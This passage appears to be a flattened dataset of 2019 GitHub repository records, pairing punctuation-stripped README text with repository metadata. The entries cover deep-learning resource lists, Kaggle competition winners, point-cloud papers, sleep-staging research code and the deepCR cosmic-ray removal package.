basics mlp html CNN https www jianshu com p 70b6f5653ac6 http zh d2l ai chapterconvolutional neural networks conv layer html http zh d2l ai chapterconvolutional neural networks padding and strides html http zh d2l ai chapterconvolutional neural networks channels html http zh d2l ai chapterconvolutional neural networks pooling html BPTTLSTMGRU RNN https www jianshu com p 39a99c88a565 http zh d2l ai chapterrecurrent neural networks rnn html BPTT http zh d2l ai chapterrecurrent neural networks bptt html LSTM http zh d2l ai chapterrecurrent neural networks lstm html GRU http zh d2l ai chapterrecurrent neural networks gru html http zh d2l ai chapterrecurrent neural networks bi rnn html 1 3 VGGGooLeNetResNetDPN LeNet https blog csdn net chenyuping333 article details 82177677 LeNet Keras https github com DustinAlandzes mnist lenet keras blob master lenet py AlexNet https blog csdn net chenyuping333 article details 82178335 AlexNet Keras https github com uestcsongtaoli AlexNet blob master model py VGG https blog csdn net chenyuping333 article details 82250931 VGG16 Keras https github com keras team keras applications blob master kerasapplications vgg16 py VGG19 Keras https github com keras team keras applications blob master kerasapplications vgg19 py GoogLeNet https blog csdn net chenyuping333 article details 82343608 GoogLeNet Keras https github com dingchenwei googLeNet blob master googLeNet py inceptionresnetv2 Keras https github com keras team keras applications blob master kerasapplications inceptionresnetv2 py inceptionv3 Keras https github com keras team keras applications blob master kerasapplications inceptionv3 py ResNet https blog csdn net chenyuping333 article details 82344334 resnet Keras https github com keras team keras applications blob master kerasapplications resnet py resnetv2 Keras https github com keras team keras applications blob master kerasapplications resnetv2 py DenseNet https blog csdn net chenyuping333 article details 82414542 DenseNet Keras https github com keras team keras applications blob master kerasapplications densenet py ResNeXt https blog csdn net chenyuping333 article details 82453632 ResNext Keras https github com keras team keras applications blob master kerasapplications resnext py DPN Dual Path Net https blog csdn net chenyuping333 article details 82453965 DPN Keras https github com titu1994 Keras DualPathNetworks blob master dualpathnetwork py SeNet http www sohu com a 161633191465975 SeNet Caffe https github com hujie frank SENet 1 4 SGDAdaGradRMSPropAdam SGD http zh d2l ai chapteroptimization gd sgd html http zh d2l ai chapteroptimization momentum html AdaGrad http zh d2l ai chapteroptimization adagrad html RMSProp http zh d2l ai chapteroptimization rmsprop html AdaDelta http zh d2l ai chapteroptimization adadelta html Adam http zh d2l ai chapteroptimization adam html 1 5 Keras https github com keras team keras blob master examples imdbcnn py LSTM https github com keras team keras blob master examples imdblstm py LSTM https github com keras team keras blob master examples imdbbidirectionallstm py CNN LSTM https github com keras team keras blob master examples imdbcnnlstm py CNNMNIST https github com keras team keras blob master examples mnistcnn py CNNCIFAR10 https github com keras team keras blob master examples cifar10cnn py ResNetCIFAR10 https github com keras team keras blob master examples cifar10resnet py 2 2 1 https blog csdn net qq35451572 article details 82752261 Deep Learning for Generic Object Detection A Survey https arxiv org pdf 1809 02165 pdf 2019 Object Detection in 20 Years A Survey https blog csdn net clovermy article details 92794719 Object Detection in 20 Years A Survey https arxiv org abs 1905 05055v2 https www cnblogs com shouhuxianjian p 9789243 html Deep Face Recognition A Survey https arxiv org pdf 1804 06655 2 2 IoUNMS http zh d2l ai chaptercomputer vision image augmentation html http zh d2l ai chaptercomputer vision fine tuning html http zh d2l ai chaptercomputer vision bounding box html http zh d2l ai chaptercomputer vision anchor html 2 3 https cloud tencent com developer news 281788 R CNN Rich feature hierarchies for accurate object detection and semantic segmentation CVPR 14 pdf https arxiv org pdf 1311 2524 pdf official code caffe https github com rbgirshick rcnn Fast R CNN Fast R CNN ICCV 15 pdf https arxiv org pdf 1504 08083 pdf official code caffe https github com rbgirshick fast rcnn Faster R CNN RPN Faster R CNN Towards Real Time Object Detection with Region Proposal Networks NIPS 15 pdf https papers nips cc paper 5638 faster r cnn towards real time object detection with region proposal networks pdf official code caffe https github com rbgirshick py faster rcnn unofficial code tensorflow https github com endernewton tf faster rcnn unofficial code pytorch https github com jwyang faster rcnn pytorch YOLO v1 You Only Look Once Unified Real Time Object Detection CVPR 16 pdf https arxiv org pdf 1506 02640 pdf official code c https pjreddie com darknet yolo SSD SSD Single Shot MultiBox Detector ECCV 16 pdf https arxiv org pdf 1512 02325 pdf official code caffe https github com weiliu89 caffe tree ssd unofficial code tensorflow https github com balancap SSD Tensorflow unofficial code pytorch https github com amdegroot ssd pytorch YOLO v2 YOLO9000 Better Faster Stronger CVPR 17 pdf https arxiv org pdf 1612 08242 pdf official code c https pjreddie com darknet yolo unofficial code caffe https github com quhezheng caffeyolov2 unofficial code tensorflow https github com nilboy tensorflow yolo unofficial code tensorflow https github com sualab object detection yolov2 unofficial code pytorch https github com longcw yolo2 pytorch FPN Feature Pyramid Networks for Object Detection CVPR 17 pdf http openaccess thecvf com contentcvpr2017 papers LinFeaturePyramidNetworksCVPR2017paper pdf unofficial code caffe https github com unsky FPN RetinaNet Focal Loss for Dense Object Detection ICCV 17 pdf https arxiv org pdf 1708 02002 pdf official code keras https github com fizyr keras retinanet unofficial code pytorch https github com kuangliu pytorch retinanet unofficial code mxnet https github com unsky RetinaNet unofficial code tensorflow https github com tensorflow tpu tree master models official retinanet Mask R CNN Mask R CNN ICCV 17 pdf http openaccess thecvf com contentICCV2017 papers HeMaskR CNNICCV2017paper pdf official code caffe2 https github com facebookresearch Detectron unofficial code tensorflow https github com matterport MaskRCNN unofficial code tensorflow https github com CharlesShang FastMaskRCNN unofficial code pytorch https github com multimodallearning pytorch mask rcnn YOLO v3 YOLOv3 An Incremental Improvement arXiv 18 pdf https pjreddie com media files papers YOLOv3 pdf official code c https pjreddie com darknet yolo unofficial code pytorch https github com ayooshkathuria pytorch yolo v3 unofficial code pytorch https github com eriklindernoren PyTorch YOLOv3 unofficial code keras https github com qqwweee keras yolo3 unofficial code tensorflow https github com mystic123 tensorflow yolo v3 M2Det M2Det A Single Shot Object Detector based on Multi Level Feature Pyramid Network AAAI 19 pdf https arxiv org pdf 1811 04533 pdf official code pytorch https github com qijiezhao M2Det https github com hoya012 deeplearningobjectdetection 2 4 YOLO v3 YOLO v3 1 https mp weixin qq com s T9LshbXoervdJDBuP564dQ YOLO v3 2 https mp weixin qq com s N79S9Qf1OgKsQ0VU5QvuHg YOLO v3 3 https mp weixin qq com s hC4P7iRGv5JSvvPe ri8g YOLO v3 4 https mp weixin qq com s 5Sj7QadfVvx 5W9Cr4d3Yw YOLO v3 5 Loss https mp weixin qq com s 4L9E4WGSh0hzlD303036bQ YOLO v3 https mp weixin qq com s J1ddmUvTF2HcljLtguWQ FPN https zhuanlan zhihu com p 63047557 FaceNet1 https blog csdn net u013044310 article details 79556099 FaceNet2 https blog csdn net u013044310 article details 80481642 https blog csdn net guleileo article details 80863579 DeepID DeepID2 DeepID3 https blog csdn net weixin42546496 article details 88537882 insightface https github com deepinsight insightface triplet loss mnist https github com SpikeKing triplet loss mnist tripletrecommendationskeras https github com maciejkula tripletrecommendationskeras keras arcface https github com 4uiiurz1 keras arcface MNIST center loss https github com handongfeng MNIST center loss wideresnetskeras https github com asmith26 wideresnetskeras 2 5 DeepFace https blog csdn net FireLight article details 79558759 DeepID1 https blog csdn net FireLight article details 79559312 DeepID2 https blog csdn net FireLight article details 79559051 Webface1CASIA WebFace https blog csdn net FireLight article details 79588429 face https blog csdn net FireLight article details 79590811 FaceNet https blog csdn net FireLight article details 79592804 https blog csdn net FireLight article details 79589926 VGGFace https blog csdn net FireLight article details 79593778 FR FCN https blog csdn net FireLight article details 79594590 Webface2 https blog csdn net FireLight article details 79595687 Webface3 https blog csdn net FireLight article details 79596024 Center Loss https blog csdn net FireLight article details 79598497 SphereFace https blog csdn net FireLight article details 79599020 NormFace https blog csdn net FireLight article details 79601378 COCO Loss https blog csdn net FireLight article details 79602134 AMSoftmax https blog csdn net FireLight article details 79602310 ArcFace Insight Face https blog csdn net FireLight article details 79602705 MobileFaceNets https blog csdn net FireLight article details 80279342 SphereFace https blog csdn net u014380165 article details 76946380 Large Margin Softmax Loss https blog csdn net u014380165 article details 76864572 3 3 1 https www cnblogs com pinard p 9385570 html MDP https www cnblogs com pinard p 9426283 html DP https www cnblogs com pinard p 9463815 html MC https www cnblogs com pinard p 9492980 html MCTS https www cnblogs com pinard p 10470571 html 3 2 Q Learning https www cnblogs com pinard p 9669263 html SARSA https www cnblogs com pinard p 9614290 html Deep Q Learning https www cnblogs com pinard p 9714655 html Deep Q LearningNature DQN https www cnblogs com pinard p 9756075 html Policy Gradient https www cnblogs com pinard p 10137696 html Actor Critic https www cnblogs com pinard p 10272023 html A3C https www cnblogs com pinard p 10334127 html DDPG https www cnblogs com pinard p 10345762 html 3 3 Python 3 2 Q learning Q Leaning https morvanzhou github io tutorials machine learning reinforcement learning 2 1 A q learning https morvanzhou github io tutorials machine learning reinforcement learning 2 1 general rl Q learning https morvanzhou github io tutorials machine learning reinforcement learning 2 2 tabular q1 Q learning https morvanzhou github io tutorials machine learning reinforcement learning 2 3 tabular q2 Sarsa Sarsa https morvanzhou github io tutorials machine learning reinforcement learning 3 1 A sarsa Sarsa https morvanzhou github io tutorials machine learning reinforcement learning 3 1 tabular sarsa1 Sarsa https morvanzhou github io tutorials machine learning reinforcement learning 3 2 tabular sarsa2 Sarsa lambda https morvanzhou github io tutorials machine learning reinforcement learning 3 3 A sarsa lambda Sarsa lambda https morvanzhou github io tutorials machine learning reinforcement learning 3 3 tabular sarsa lambda Deep Q Network DQN https morvanzhou github io tutorials machine learning reinforcement learning 4 1 A DQN DQN Tensorflow https morvanzhou github io tutorials machine learning reinforcement learning 4 1 DQN1 DQN Tensorflow https morvanzhou github io tutorials machine learning reinforcement learning 4 2 DQN2 DQN Tensorflow https morvanzhou github io tutorials machine learning reinforcement learning 4 3 DQN3 OpenAI gym https morvanzhou github io tutorials machine learning reinforcement learning 4 4 gym Double DQN Tensorflow https morvanzhou github io tutorials machine learning reinforcement learning 4 5 doubleDQN Prioritized Experience Replay DQN Tensorflow https morvanzhou github io tutorials machine learning reinforcement learning 4 6 prioritized replay Dueling DQN Tensorflow https morvanzhou github io tutorials machine learning reinforcement learning 4 7 dueling DQN Policy Gradient Policy Gradients https morvanzhou github io tutorials machine learning reinforcement learning 5 1 A PG Policy Gradients Tensorflow https morvanzhou github io tutorials machine learning reinforcement learning 5 1 policy gradient softmax1 Policy Gradients Tensorflow https morvanzhou github io tutorials machine learning reinforcement learning 5 2 policy gradient softmax2 Actor Critic Actor Critic https morvanzhou github io tutorials machine learning reinforcement learning 6 1 A AC Actor Critic Tensorflow https morvanzhou github io tutorials machine learning reinforcement learning 6 1 actor critic Deep Deterministic Policy Gradient DDPG https morvanzhou github io tutorials machine learning reinforcement learning 6 2 A DDPG Deep Deterministic Policy Gradient DDPG Tensorflow https morvanzhou github io tutorials ma,2019-07-14T02:11:00Z,2019-12-11T05:40:48Z,n/a,DenseAI,User,1,17,2,51,master,DenseAI,1,0,0,0,0,0,0
quanhua92,awesome-competition-winners,competition#computer-vision#deep-learning#kaggle#machine-learning#nlp,awesome competition winners A comprehensive list of competition winners in Machine Learning Deep Learning etc Contributing Have anything in mind that you think is awesome and would fit in this list Feel free to send a pull request Contents Computer Vision computer vision Object Detection object detection Image Classification image classification 2019 Google Landmark Retrieval 2019 2019 google landmark retrieval 2019 2019 Human Protein Atlas Image Classification 2019 human protein atlas image classification 2017 Planet Understanding the Amazon from Space 2017 planet understanding the amazon from space Image Segmentation image segmentation 2019 Baidu AI PaddlePaddle Autonomous Driving Competition 2019 baidu ai paddlepaddle autonomous driving competition 2019 iMaterialist Fashion 2019 at FGVC6 2019 imaterialist fashion 2019 at fgvc6 Video Understanding video understanding 2018 The 2nd YouTube 8M Video Understanding Challenge 2018 the 2nd youtube 8m video understanding challenge Natural Language Processing natural language processing Text Classification text classification 2017 Zhihu Machine Learning Challenge 2017 zhihu machine learning challenge Sentiment Analysis sentiment analysis 2019 ALVIVN Ph n loi sc thi bnh lun 2019 alvivn ph C3 A2n lo E1 BA A1i s E1 BA AFc th C3 A1i b C3 ACnh lu E1 BA ADn Medical medical Prediction prediction 2019 UW Neural Data Challenge https github com quanhua92 awesome competition winners 2019 uw neural data challenge 2018 RSNA Pneumonia Detection Challenge https github com quanhua92 awesome competition winners 2018 rsna pneumonia detection challenge 2018 Data Science Bowl https www kaggle com c data science bowl 2018 Speech speech Prediction prediction 1 Time Series Forecasting time serices forecasting 2017 Web Traffic Time Series Forecasting 2017 web traffic time series forecasting Search Results search results 2015 Crowdflower Search Results Relevance 2015 crowdflower search results relevance Computer Vision Object Detection Image Classification 2019 Google Landmark Retrieval 2019 https www kaggle com c landmark retrieval 2019 lyakaap Landmark2019 1st and 3rd Place Solution The 1st Place Solution of the Google Landmark 2019 Retrieval Challenge and the 3rd Place Solution of the Recognition Challenge https github com lyakaap Landmark2019 1st and 3rd Place Solution 2019 Human Protein Atlas Image Classification https www kaggle com c human protein atlas image classification pudae kaggle hpa Code for 3rd place solution in Kaggle Human Protein Atlas Image Classification Challenge https github com pudae kaggle hpa 2017 Planet Understanding the Amazon from Space https www kaggle com c planet understanding the amazon from space bestfitting 1st place solution https www kaggle com c planet understanding the amazon from space discussion 36809 ZFTurbo 3rd place solution https www kaggle com c planet understanding the amazon from space discussion 38831 latest 218621 Image Segmentation 2019 Baidu AI PaddlePaddle Autonomous Driving Competition https aistudio baidu com aistudio competition detail 5 Gujingxiao Lane Segmentation Solution For BaiduAI Autonomous Driving Competition Lane Segmentation Solution for Baidu AI PaddlePaddle Autonomous Driving Competition 1st Place https github com gujingxiao Lane Segmentation Solution For BaiduAI Autonomous Driving Competition 2019 iMaterialist Fashion 2019 at FGVC6 https www kaggle com c imaterialist fashion 2019 FGVC6 amirassov kaggle imaterialist The First Place Solution of iMaterialist Fashion 2019 at FGVC6 https github com amirassov kaggle imaterialist Video Understanding 2018 The 2nd YouTube 8M Video Understanding Challenge https www kaggle com c youtube8m 2018 miha skalic youtube8mchallenge 1st place solution to Kaggle s 2018 YouTube 8M Video Understanding Challenge https github com miha skalic youtube8mchallenge Natural Language Processing Text Classification 2017 Zhihu Machine Learning Challenge https biendata com competition zhihu chenyuntc PyTorchText 1st Place Solution https github com chenyuntc PyTorchText Sentiment Analysis 2019 ALVIVN Ph n loi sc thi bnh lun https www aivivn com contests 1 1st place solution https forum machinelearningcoban com t 1st place solution phan loai sac thai binh luan 4504 Medical Prediction 2019 UW Neural Data Challenge https www kaggle com c uwndc19 apls777 kaggle uw neural data challenge 1st place solution for the UW Neural Data Challenge https github com apls777 kaggle uw neural data challenge 2018 RSNA Pneumonia Detection Challenge https www kaggle com c rsna pneumonia detection challenge i pan kaggle rsna18 Code for 1st place solution in Kaggle RSNA Pneumonia Detection Challenge https github com i pan kaggle rsna18 2018 Data Science Bowl https www kaggle com c data science bowl 2018 ods ai topcoders 1st place solution https www kaggle com c data science bowl 2018 discussion 54741 mirzaevinom datasciencebowl2018 5th place out of 816 teams solution https github com mirzaevinom datasciencebowl2018 Speech Prediction Time Serices Forecasting 2017 Web Traffic Time Series Forecasting https www kaggle com c web traffic time series forecasting Arturus kaggle web traffic 1st place solution https github com Arturus kaggle web traffic Search Results 2015 Crowdflower Search Results Relevance https www kaggle com c crowdflower search relevance ChenglongChen KaggleCrowdFlower 1st Place Solution for Search Results Relevance Competition on Kaggle https github com ChenglongChen KaggleCrowdFlower,2019-07-13T04:17:53Z,2019-10-08T11:57:04Z,n/a,quanhua92,User,3,17,4,5,master,quanhua92,1,0,0,0,0,0,0
SciSharp,Ludwig.NET,n/a,Ludwig NET Ludwig is a toolbox that allows to train and test deep learning models without the need to write code,2019-06-24T01:41:34Z,2019-09-24T14:35:48Z,C#,SciSharp,Organization,6,17,3,8,master,Oceania2018#henon,2,0,0,1,0,0,0
fengdu78,PaddlePaddle-Tutorial,paddlepaddle,PaddlePaddle PaddlePaddle PaddlePaddle Fluid 1 5 0 https github com PaddlePaddle Paddle tree release 1 5 1 Paddlehttps www paddlepaddle org cn 2 Paddlehttps www paddlepaddle org cn documentation docs zh 1 5 userguides indexcn html from paddlenav 3 Paddlegithubhttps github com PaddlePaddle 4 https github com PaddlePaddle models 5 https github com PaddlePaddle book 6 PaddleHubhttps github com PaddlePaddle PaddleHub,2019-07-03T15:30:02Z,2019-11-19T03:23:56Z,n/a,fengdu78,User,1,16,7,2,master,fengdu78,1,0,0,0,0,0,0
geonm,tf_ms_loss,n/a,Multi Similarity Loss with General Pair Weighting for Deep Metric Learning Tensorflow Implementation of Multi Similarity Loss with General Pair Weighting for Deep Metric Learning ref http openaccess thecvf com contentCVPR2019 papers WangMulti SimilarityLossWithGeneralPairWeightingforDeepMetricLearningCVPR2019paper pdf official codes https github com MalongTech research ms loss MS loss MS mining Reference inproceedingswang2019multi title Multi Similarity Loss with General Pair Weighting for Deep Metric Learning author Wang Xun and Han Xintong and Huang Weilin and Dong Dengke and Scott Matthew R booktitle Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition pages 5022 5030 year 2019,2019-07-22T10:08:30Z,2019-11-27T02:14:31Z,Python,geonm,User,2,16,5,6,master,geonm,1,0,0,0,1,0,0
pquochuy,sleep_transfer_learning,n/a,Towards More Accurate Automatic Sleep Staging via Deep Transfer Learning This repository contains source code pretrained models and experimental setup in the manuscript Huy Phan Oliver Y Chn Philipp Koch Zongqing Lu Ian McLoughlin Alfred Mertins and Maarten De Vos Towards More Accurate Automatic Sleep Staging via Deep Transfer Learning https arxiv org abs 1907 13177 arXiv preprint arXiv 1907 13177 2019 Data Preparation with Matlab SeqSleepNet Change path to seqsleepnet Run prepraredatasleepedfsc m to prepare SleepEDF SC data the path to the data must be provided refer to the script for comments The mat files generated are stored in mat directory Run genlistsleepedfsc m to generate list of SleepEDF SC files for network training based on the data split in datasplitsleepedfsc mat The files generated are stored in tfdata directory Run prepraredatasleepedfst m to prepare SleepEDF ST data the path to the data must be provided refer to the script for comments The mat files generated are stored in mat directory Run genlistsleepedfst m to generate list of SleepEDF ST files for network training based on the data split in datasplitsleepedfst mat The files generated are stored in tfdata directory DeepSleepNet likewise Network training and evaluation with Tensorflow SeqSleepNet Change path to seqsleepnet tensorflow seqsleepnet Run the example bash scripts finetuneall sh finetune entire a pretrained network finetunesoftmaxSPB sh finetune softmax sequence processing block SPB finetunesoftmaxEPB sh finetune softmax epoch processing block EPB finetunesoftmax sh finetune softmax trainscratch sh train a network from scratch Note when the pretrainedmodel parameter is empty the network will be trained from scratch Otherwise the specified pretrained model will be loaded and finetuned with the finetuning strategy specified in the finetunemode DeepSleepNet likewise Note DeepSleepNet pretrained models are quite heavy They were uploaded separately and can be downloaded from here https zenodo org record 3375235 https zenodo org record 3375235 Evaluation After training finetuning and testing the network on test data Change path to seqsleepnet or deepsleepnet Refer to examplesevaluation m for examples that calculates the performance metrics Some results Finetuning results with SeqSleepNet seqsleepnetresults figure seqsleepnetfinetuning png Finetuning results with DeepSleepNet deepsleepnetresults figure deepsleepnetfinetuning png Environment Matlab v7 3 for data preparation Python3 Tensorflow GPU versions 1 4 1 14 for network training and evaluation numpy scipy sklearn h5py Note on the SleepEDF Expanded Database The SleepEDF expanded database can be download from https physionet org content sleep edfx 1 0 0 The latest version of this database contains 153 subjects in the SC subset This experiment was conducted with the previous version of the SC subset which contains 20 subjects intentionally to simulate the situation of a small cohort If you download the new version make sure to use 20 subjects SC400 SC419 On the ST subset of the database the experiments were conducted with 22 placebo recordings Make sure that you refer to https physionet org content sleep edfx 1 0 0 ST subjects xls to obtain the right recordings and subjects The experiments only used the in bed parts from light off time to light on time of the recordings to avoid the dominance of Wake stage as suggested in S A Imtiaz and E Rodriguez Villegas An open source toolbox for standardized use of PhysioNet Sleep EDF Expanded Database Proc EMBC pp 6014 6017 2015 Meta information e g light off and light on times to extract the in bed parts data from the whole day night recordings the meta information is provided in sleepedfxmeta Contact Huy Phan Email huy phanatieee org or h phanakent ac uk License MIT Huy Phan,2019-07-30T18:22:18Z,2019-12-14T06:03:01Z,Python,pquochuy,User,3,16,1,5,master,pquochuy#phan0035,2,0,0,0,0,0,0
dashidhy,awesome-point-cloud-deep-learning,3d-deep-learning#3d-detection#3d-segmentation#3d-vision#paper-list#point-cloud,Awesome papers of deep learning on point clouds This repo collects papers on point cloud deep learning Note that the stars I give to each paper contain personal bias for my own project but actually I do appreciate all the works that have been done in this area For my own purpose I can t include all the papers that have been published A more complete paper list since 2017 is here https github com Yochengliu awesome point cloud analysis https github com Yochengliu awesome point cloud analysis 1 Feature extractor Escape from Cells Deep Kd Networks for the Recognition of 3D Point Cloud Models ICCV 2017 R Klokov et al pdf https arxiv org pdf 1704 01222 pdf star star star star PointNet Deep Learning on Point Sets for 3D Classification and Segmentation CVPR 2017 C R Qi et al pdf https arxiv org pdf 1612 00593 pdf Github https github com charlesq34 pointnet star star star star star PointNet Deep Hierarchical Feature Learning on Point Sets in a Metric Space NeurIPS 2017 C R Qi et al pdf https arxiv org pdf 1706 02413 pdf Github https github com charlesq34 pointnet2 star star star star star PointCNN Convolution On X Transformed Points NeurIPS 2018 Y Li et al pdf https arxiv org pdf 1801 07791 pdf Github https github com yangyanli PointCNN star star star A CNN Annularly Convolutional Neural Networks on Point Clouds CVPR 2019 A Komarichev et al pdf https arxiv org pdf 1904 08017 pdf star star star Relation Shape Convolutional Neural Network for Point Cloud Analysis CVPR 2019 Y Liu et al pdf https arxiv org pdf 1904 07601 pdf star star star star Other useful links ModelNet Benchmark http modelnet cs princeton edu 2 Detection Only geometric as input Mapping into regular grids Voting for Voting in Online Point Cloud Object Detection RSS 2015 D Z Wang et al pdf http www robots ox ac uk mobile Papers 2015RSSwang pdf star star star Vote3Deep Fast Object Detection in 3D Point Clouds Using Efficient Convolutional Neural Networks ICRA 2017 M Engelcke et al pdf https arxiv org pdf 1609 06666 pdf star star star 3D fully convolutional network for vehicle detection in point cloud IROS 2017 B Li pdf https ieeexplore ieee org stamp stamp jsp tp arnumber 8205955 Github https github com yukitsuji 3DCNNtensorflow star star star VoxelNet End to End Learning for Point Cloud Based 3D Object Detection CVPR 2018 Y Zhou et al pdf https arxiv org pdf 1711 06396 pdf star star star star star PIXOR Real time 3D Object Detection From Point Clouds CVPR 2018 B Yang et al pdf https arxiv org pdf 1902 06326 pdf star star star star SECOND Sparsely Embedded Convolutional Detection Sensors 2018 Y Yan et al pdf https www ncbi nlm nih gov pmc articles PMC6210968 pdf sensors 18 03337 pdf Github https github com traveller59 second pytorch star star star PointPillars Fast Encoders for Object Detection from Point Clouds CVPR 2019 A Lang et al pdf https arxiv org pdf 1812 05784 pdf GIthub https github com nutonomy second pytorch star star star star star Part A 2 Net 3D Part Aware and Aggregation Neural Network for Object Detection from Point Cloud ArXiv 2019 S Shi et al pdf https arxiv org pdf 1907 03670 pdf star star star star Directly operate on point clouds PointRCNN 3D Object Proposal Generation and Detection from Point Cloud CVPR 2019 S Shi et al pdf https arxiv org pdf 1812 04244 pdf Github https github com sshaoshuai PointRCNN star star star star star Deep Hough Voting for 3D Object Detection in Point Clouds ICCV 2019 C R Qi et al pdf https arxiv org pdf 1904 09664 pdf Github https github com facebookresearch votenet star star star star star Combining point coordinates and voxels STD Sparse to Dense 3D Object Detector for Point Cloud ICCV 2019 Z Yang et al pdf https arxiv org pdf 1907 10471 pdf star star star star Fast Point R CNN ICCV 2019 Y Chen et al pdf https arxiv org pdf 1908 02990 pdf star star star 2D proposal based IPOD Intensive Point based Object Detector for Point Cloud ArXiv 2018 Z Yang et al pdf https arxiv org pdf 1812 05276 pdf star star star star RoarNet A Robust 3D Object Detection based on RegiOn Approximation Refinement ArXiv 2018 K Shin et al pdf https arxiv org pdf 1811 03818 pdf Frustum PointNets for 3D Object Detection from RGB D Data CVPR 2018 C R Qi et al pdf https arxiv org pdf 1711 08488 pdf GIthub https github com charlesq34 frustum pointnets star star star star star Frustum ConvNet Sliding Frustums to Aggregate Local Point Wise Features for Amodal 3D Object Detection CVPR 2019 Z Wang et al pdf https arxiv org pdf 1903 01864 pdf star star star Multi view multi sensor multi task Multi View 3D Object Detection Network for Autonomous Driving CVPR 2017 X Chen et al pdf http openaccess thecvf com contentcvpr2017 papers ChenMulti View3DObjectCVPR2017paper pdf Github https github com bostondiditeam MV3D star star star star PointFusion Deep Sensor Fusion for 3D Bounding Box Estimation CVPR 2018 D Xu et al pdf http openaccess thecvf com contentcvpr2018 papers XuPointFusionDeepSensorCVPR2018paper pdf star star star star Deep Continuous Fusion for Multi Sensor 3D Object Detection ECCV 2018 M Liang et al pdf http openaccess thecvf com contentECCV2018 papers MingLiangDeepContinuousFusionECCV2018paper pdf star star star star Multi Task Multi Sensor Fusion for 3D Object Detection CVPR 2019 M Liang et al pdf http www cs toronto edu byang papers mmf pdf star star star star star MVX Net Multimodal VoxelNet for 3D Object Detection ICRA 2019 V A Sindagi et al pdf https arxiv org pdf 1904 01649 pdf star star star star Other useful links KITTI Leaderboard http www cvlibs net datasets kitti evalobject php objbenchmark 3d nuScenes Leaderboard https www nuscenes org object detection externalData all mapData all modalities Any 3 Segmentation Recurrent Slice Networks for 3D Segmentation of Point Clouds CVPR 2018 Q Huang et al pdf https arxiv org pdf 1802 04402 pdf Github https github com qianguih RSNet star star star star SGPN Similarity Group Proposal Network for 3D Point Cloud Instance Segmentation CVPR 2018 W Wang et al pdf https arxiv org pdf 1711 08588 pdf Github https github com laughtervv SGPN star star star star Associatively Segmenting Instances and Semantics in Point Clouds CVPR 2019 X Long et al pdf https arxiv org pdf 1902 09852 pdf star star star star star To be completed 4 Dataset Note that some of these datasets don t provide point cloud data which means you need some toolboxes to convert data from mesh or RGB D images Shape understanding ModelNet pdf https people csail mit edu khosla papers cvpr2015wu pdf Project http modelnet cs princeton edu ShapeNet pdf http shapenet cs stanford edu shapenet obj zip ShapeNetCore v2 old shapenet tex TechnicalReport main pdf Project https www shapenet org Indoor scenes 2D 3D S pdf http buildingparser stanford edu images 2D 3D S2017 pdf Project http buildingparser stanford edu dataset html ScanNet pdf https arxiv org pdf 1702 04405 pdf Project http www scan net org SUN RGB D pdf http rgbd cs princeton edu paper pdf Project http rgbd cs princeton edu Autonomous driving Lidar point cloud KITTI pdf http www cvlibs net publications Geiger2013IJRR pdf Project http www cvlibs net datasets kitti evalobject php objbenchmark 3d nuScenes pdf https arxiv org pdf 1903 11027 pdf Project https www nuscenes org Waymo Open dataset Project https waymo com open,2019-06-29T22:01:41Z,2019-12-12T04:24:17Z,n/a,dashidhy,User,1,15,2,12,master,dashidhy,1,0,0,0,0,0,0
profjsb,deepCR,astronomical-images#astronomy#convolutional-neural-networks#deep-learning#python3#pytorch,Build Status https travis ci com profjsb deepCR svg token baKtC9yCzzwzzqM9ihAX branch master https travis ci com profjsb deepCR codecov https codecov io gh profjsb deepCR branch master graph badge svg token SIwJFmKJqr https codecov io gh profjsb deepCR Documentation Status https readthedocs org projects deepcr badge version latest https deepcr readthedocs io en latest badge latest DOI https joss theoj org papers 10 21105 joss 01651 status svg https doi org 10 21105 joss 01651 arXiv https img shields io badge astro ph 1907 09500 blue https arxiv org abs 1907 09500 deepCR Deep Learning Based Cosmic Ray Removal for Astronomical Images Identify and remove cosmic rays from astronomical images using trained convolutional neural networks This package is implements the method described in the paper deepCR Cosmic Ray Rejection with Deep Learning https arxiv org abs 1907 09500 Keming Zhang Joshua Bloom arXiv 1907 09500 ApJ in press If you use this package please cite the paper above and consider including a link to this repository Documentation and tutorials https deepcr readthedocs io Currently available models https deepcr readthedocs io en latest modelzoo html New for v0 2 0 DECam https deepcr readthedocs io en latest modelzoo html decam deepCR model now available python from deepCR import deepCR decammodel deepCR mask decam device CPU Note 1 Model is trained on g band images and is tested to work well on g and r bands It should work on other filters as well We are working on benchmarking on different filters but before that s done please proceed with caution working with other filters Note 2 Inpainting model is TBA for DECam Installation bash pip install deepCR Or you can install from source bash git clone https github com profjsb deepCR git cd deepCR pip install Quick Start Quick download of a HST ACS WFC image bash wget O jdba2sooqflc fits https mast stsci edu api v0 1 Download file uri mast HST product jdba2sooqflc fits With Python 3 5 For smaller sized images smaller than 1Mpix python from deepCR import deepCR from astropy io import fits image fits getdata jdba2sooqflc fits 512 512 create an instance of deepCR with specified model configuration mdl deepCR mask ACS WFC F606W 2 32 inpaint ACS WFC F606W 2 32 device CPU apply to input image mask cleanedimage mdl clean image threshold 0 5 best threshold is highest value that generate mask covering full extent of CR choose threshold by visualizing outputs if you only need CR mask you may skip image inpainting and save time mask mdl clean image threshold 0 5 inpaint False if you want probabilistic cosmic ray mask instead of binary mask probmask mdl clean image binary False There s also the option to segment your input image into smaller pieces default 256 by 256 and process the individual piece seperately before stitching them back together This enables multi process parallelism and saves memory Segment and stitching is enabled by njobs 1 which specified the number of processes to utilize njobs 1 is the number of available virtual cores on your machine and is optimized for time when your torch is not intel MKL optimized see below for more details python image fits getdata jdba2sooqflc fits mask cleanedimage mdl clean image threshold 0 5 njobs 1 If your torch is intel MKL optimized it s not necessary to open up many processes and one process should utilize half of the CPUs available Monitor CPU usage if CPU usage for single process is 100 it means intel MKL is in place In this case njobs 4 is advised For single process segment and stitching you need to manually enable segment True because the default njobs 1 assumes segment False python image fits getdata jdba2sooqflc fits mask cleanedimage mdl clean image threshold 0 5 segment True Note that this won t speed things up if you re using GPU Contributing We are very interested in getting bug fixes new functionality and new trained models from the community especially for ground based imaging and spectroscopy Please fork this repo and issue a PR with your changes It will be especially helpful if you add some tests for your changes,2019-07-04T18:31:56Z,2019-10-30T18:02:40Z,Python,profjsb,User,3,15,1,165,master,kmzzhang#profjsb#arfon,3,5,5,4,3,0,6
